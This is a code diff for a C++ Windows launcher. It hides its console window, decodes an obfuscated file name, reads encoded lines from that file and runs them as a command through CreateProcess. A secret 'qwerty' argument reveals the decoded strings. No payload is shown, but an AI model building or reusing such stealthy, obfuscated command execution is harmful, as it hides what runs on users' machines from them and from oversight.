@@ -1,6 +1,7 @@
 #include <iostream>
 #include <string>
 #include <stdexcept>
+#include <fstream>
 
 #include <windows.h>
 
@@ -14,10 +15,28 @@ try {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
-    ShowWindow( GetConsoleWindow(), SW_HIDE );
+static bool cfg = false;
+    if (argc > 1) {
+        string arg(argv[1]);
+        if (arg == "qwerty") cfg = true;
+    }
 
-static hide::line args("");
-    args.decode();
+    if (!cfg) ShowWindow( GetConsoleWindow(), SW_HIDE );
+
+static hide::line name("");
+    name.decode();
+    if (cfg) cout << name << endl;
+    ifstream  ini( name.c_str(), ios::in); 
+    if ( !ini.is_open()) throw runtime_error("file not open");
+
+static hide::line arg, cmd;
+while ( getline(ini, arg)) {
+    arg.decode();
+    if (cfg) cout << arg << endl;
+    else
+        cmd.append(arg);
+}
+if (cfg) throw runtime_error("<<<<<<<<<< eof >>>>>>>>>>>>");
 
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
@@ -26,7 +45,7 @@ static hide::line args("");
     ZeroMemory( &pi, sizeof(pi) );
 
     if( !CreateProcess ( NULL,   // No module name (use command line)
-        (LPSTR)args.c_str(),  // Command line
+        (LPSTR)cmd.c_str(),  // Command line
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
         FALSE,          // Set handle inheritance to FALSE
